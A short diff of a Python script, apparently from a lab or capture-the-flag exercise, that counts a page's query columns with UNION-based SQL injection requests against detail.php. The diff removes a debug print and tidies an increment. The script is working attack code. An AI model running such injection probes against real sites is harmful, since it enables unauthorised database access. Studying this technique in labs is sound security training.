@@ -15,11 +15,10 @@ n_col = 1
 # Cerchiamo di capire quante colonne restituisce la query originale della pagine detail.php
 while True:
     response = requests.get(url+f"999'+UNION+SELECT+{payload}%23") # %23 = commento
-    print(url+f"999'+UNION+SELECT+{payload}%23")
     if not "This product is not in our catalog" in response.text:
         break
 
-    n_col = n_col + 1
+    n_col += 1
     payload = payload +  f",{n_col}"
 
 print(f"Il numero di colonne è {n_col}")
